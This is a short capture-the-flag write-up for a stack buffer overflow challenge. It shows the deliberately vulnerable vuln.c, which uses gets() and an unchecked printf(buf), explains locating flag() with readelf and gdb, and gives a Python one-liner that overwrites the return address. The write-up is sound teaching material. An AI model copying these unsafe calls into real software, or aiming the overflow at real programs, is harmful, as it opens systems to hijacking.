By looking to the vuln.c file, you can see that we need to jump to flag() function, which is going to print the flag for us.

This is possible because the program is using gets() function, which allows for overflowing the buffer, and rewrite
the return address.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}

```
To find the address of flag() function, you can use `gdb` or `readelf`
```
readelf -s vuln
gdb vuln 
(gdb) b main
(gdb) disassemble flag
```
The flag() function  address is 0x080485e6, we need to fill the buffer with dump data 'A's then when we hit the return
address we put the little indian of the flag() address.
```
python -c 'import struct; print("A"*76+struct.pack("<I",0x080485e6))'|./vuln
```
